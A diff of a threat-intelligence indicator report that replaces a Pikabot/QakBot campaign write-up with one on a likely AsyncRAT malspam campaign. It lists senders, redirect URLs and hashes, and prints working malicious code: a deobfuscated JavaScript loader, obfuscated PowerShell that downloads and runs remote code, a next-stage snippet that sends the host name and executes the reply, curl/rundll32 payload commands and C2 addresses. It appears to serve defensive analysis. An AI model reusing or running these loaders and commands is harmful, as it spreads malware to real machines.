@@ -1,74 +1,106 @@
-THREAT IDENTIFICATION: TA577 - PIKABOT
+THREAT IDENTIFICATION: LIKELY ASYNCRAT
 
 SUBJECTS OBSERVED
-The email subjects were from previously stolen email threads.
+Advanced Technologies - Elevate Your Business Standards with
+Boost Your Sales with - Empower Your Team with
+Boost Your Sales with - Join the Future of Business with
+Creative Approaches - Unlock New Opportunities with
+Customized Services - Optimize Your Operations with
+Dynamic Tools - Operational Excellence
+Innovative Solutions for - Customized Services
+Market Insights - Expert Consulting
+Professional Expertise - Sustainable Practices
+Profitable Ventures - Collaboration That Will Transform Your Business
+Redefine Success with - Enhance Your Marketing Strategy with
+Revolutionize Your Workflow with - Strategic Partnerships
+Seize the Competitive Edge with - Advanced Technologies
+Seize the Competitive Edge with - Sustainable Practices
+Strategic Insights - Maximize Your Potential with
+Sustainable Practices - Customized Services
+Sustainable Practices - Redefine Success with
 
-SENDERS OBSERVED
-lauraray@willum.arcent.io
-rroyo.nflanrau@gtchip.hu
+8SENDERS OBSERVED
+asahi-2168@jcom.zaq.ne.jp
+cabang.depok@bankdki.co.id
+demircan@remaxyasmin.com
+info@capital-fc-eg.com
+ivp@shirts.ee
+lalcaide@unicep.com.br
+mbcameron@marrybrown.com
+priscila.morbello@assistanceotc.com.ar
+sderamirez@fonac.hn
+test@argentmeat.com
+test@pnb-cosmetics.com
+true@hokejnet.cz
 
-INFECTION FLOW
-url -> zip -> js -> dll
+REDIRECT URL FROM THE EMAIL
+https://linksredirect.com/?pub_id=11031CL10085&url=https%3a%2f%2fkordblog.com%2fkordblog%2f3
+https://linksredirect.com/?pub_id=11031CL10085&url=https%3a%2f%2fkordblog.com%2fsxzaw
+https://linksredirect.com/?pub_id=11329CL10344&amp;url=https%3a%2f%2fkordblog.com%2fsxzaw
+https://linksredirect.com/?pub_id=11329CL10344&url=https%3a%2f%2fkordblog.com%2fkordblog%2f1
+https://linksredirect.com/?pub_id=11329CL10344&url=https%3a%2f%2fkordblog.com%2fsxzaw
 
-ZIP FILE DOWNLOAD REDIRECT URLS
-https://theyolarbi.com/frqob8/?42930191
+404 TDS REDIRECT URL
+https://kordblog.com/sxzaw/
+https://kordblog.com/kordblog/3/
+https://kordblog.com/kordblog/1/
 
-ZIP FILE DOWNLOAD URLS
-https://theyolarbi.com/frqob8//?YogBUrAUnxhm=1703174069
+JAVASCRIPT DOWNLOAD URL
+https://inkopau-rentcar.com/xsfwt/
 
-ZIP FILE HASHES
-OO.zip
-c464e4486a6b4273ec371d7d8e475961
+JAVASCRIPT FILE HASH
+BDJN0146_7973795.js
+f75e5a9e5ba9a987d5df74537e80930f
 
-JAVASCRIPT FILE HASHES
-Nvw.js
-40c404104519036cfdbe911e9db0075c
+DEOBFUSCATED SCRIPT
+var otrhejqxwldyazpv = [
+'winmgmts:root\\cimv2:Win32_Process',
+'less powershel',
+'conhost --head',
 
-JAVASCRIPT DIGITAL SIGNATURE INFORMATION
-Name: The New Print Shop Ltd.
-Email: Not available
-Signing Time: Thursday, December 21, 2023 10:53:40 AM
+"l $ar='ur' ;new-alias press c$($ar)l;$sczkqwhdmijf=(9100,9103,9108,9091,9104,9100,9087,9032,9102,9097,9098,9033,9035,9032,9098,9090,9098,9049,9101,9047,9101,9098,9083,9095);$dosvorv=('bronx','get-cmdlet');$zirbze=$sczkqwhdmijf;foreach($rob9e in $zirbze){$awi=$rob9e;$gmisabupxwnl=$gmisabupxwnl+[char]($awi-8986);$vizit=$gmisabupxwnl; $lira=$vizit};$exisvkodaqfl[2]=$lira;$gnstdi='rl';$five=1;.$([char](9992-9887)+'ex')(press -useb $lira)",
+'time',
+]
 
-Signer Name: SSL.com Timestamping Unit 2022
+var yltkuaxvefmgqrcp = ''
+var zrdgtmpeblxvkani = GetObject(otrhejqxwldyazpv[0])
+var array = otrhejqxwldyazpv
+var arrayLength = array.length
+if (false || 389 >= arrayLength) {
+var fumaklozjhscqegr = 0
+}
 
-PAYLOAD DOWNLOAD COMMAND
-C:\Windows\System32\cmd.exe" /c mkdir  C:\Epfijglsorg\Ijfkmvofguv & curl https://israrliaqat.com/6wX4/0.5887057656277896.dat --output C:\Epfijglsorg\Ijfkmvofguv\Wiflgodjvo.dll
+for (var index = 0; index < 389; index++) {
+var bieucoygrazhtvkx = array[389 - index + 1]
+var skamcupgqfzjrnth = array[389 - index]
+var iwfdsvptbohyxagc = array[389 - index + 2]
+fumaklozjhscqegr = bieucoygrazhtvkx + skamcupgqfzjrnth + iwfdsvptbohyxagc
+}
 
-PAYLOAD DOWNLOAD URL
-https://gofly.id/P9g/0.45320443521018944.dat
-https://grehlingerssealcoating.com/3hidbt/0.714417294473205.dat
-https://holyrosaryinternational.com/N1H3/0.3352056583612402.dat
-https://israrliaqat.com/6wX4/0.5887057656277896.dat
-https://paldiengineering.com/8WjmD9n/0.7676428391518275.dat
-https://saeedalkarmi.com/aT2ja9/0.6912414572852581.dat
+yltkuaxvefmgqrcp = fumaklozjhscqegr
+zrdgtmpeblxvkani.Create(otrhejqxwldyazpv[4])
+zrdgtmpeblxvkani.Create(otrhejqxwldyazpv[1])
+zrdgtmpeblxvkani.Create(yltkuaxvefmgqrcp)
 
-DLL FILE HASH
-Wiflgodjvo.dll
-e9bc9f88e7f61dd8260bfb2f3c6381ab
+INTERCEPTED POWERSHELL
+powershell $ar='ur' ;new-alias press c$($ar)l;$sczkqwhdmijf=(9100,9103,9108,9091,9104,9100,9087,9032,9102,9097,9098,9033,9035,9032,9098,9090,9098,9049,9101,9047,9101,9098,9083,9095);$dosvorv=('bronx','get-cmdlet');$zirbze=$sczkqwhdmijf;foreach($rob9e in $zirbze){$awi=$rob9e;$gmisabupxwnl=$gmisabupxwnl+[char]($awi-8986);$vizit=$gmisabupxwnl; $lira=$vizit};$exisvkodaqfl[2]=$lira;$gnstdi='rl';$five=1;.$([char](9992-9887)+'ex')(press -useb $lira)
 
-UNPACKED DLL FILE HASH
-dd0000.SearchFilterHost.exe
-0ca1449149c9ec557942a98c31ef3c42
+NEXT STAGE URL
+http://ruzivre.top/1.php?s=spam
 
-DLL LAUNCH COMMAND
-rundll32  C:\Epfijglsorg\Ijfkmvofguv\Wiflgodjvo.dll,Enter
+NEXT STAGE SCRIPT CODE SNIPPET (BASE64 DECODED, XOR and GUNZIPPED)
+[PARTIAL CODE SNIPPET]
+ $48y9dfu0hrqsbpw=-join ((48..57) + (97..122) | Get-Random -Count 10| % {[char]$_});
+$bi028q39wgf1nuy=-join ((48..57) + (97..122) | Get-Random -Count 5 | % {[char]$_});
+$s4gmb7nu2w9r0k1="$($48y9dfu0hrqsbpw)htr$($findom)";
+$global:block=(curl -useb "http://$wcyda5r8xu3kbvl/$s4gmb7nu2w9r0k1.php?id=$env:computername&key=$fgqjlsnu&s=spam"); 
+ iex $global:block
 
-QAKBOT C2s
-https://172.232.172.171:13721/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://185.187.235.158:23399/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://154.38.185.136:5243/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://154.38.185.135:13782/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://172.234.224.202:13785/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://172.232.189.141:2078/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://109.123.227.174:23399/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://154.221.30.136:13724/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://154.38.185.138:13786/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
-https://172.232.189.134:2221/outvoyagingPrerogative/X4bXhJeIfqsfMSyG?aromataPodiatry=MimotypicDissuading
+FILTERING STAGE URL
+http://prozvegz.top/eq2c1svfjphtr.php?id=THOR-20231222-1&key=126176454803&s=spam
 
-
-
-
-
+DECOY PAYLOAD URL
+https://temp.sh/bfseS/ruzxs.exe
 
 
 
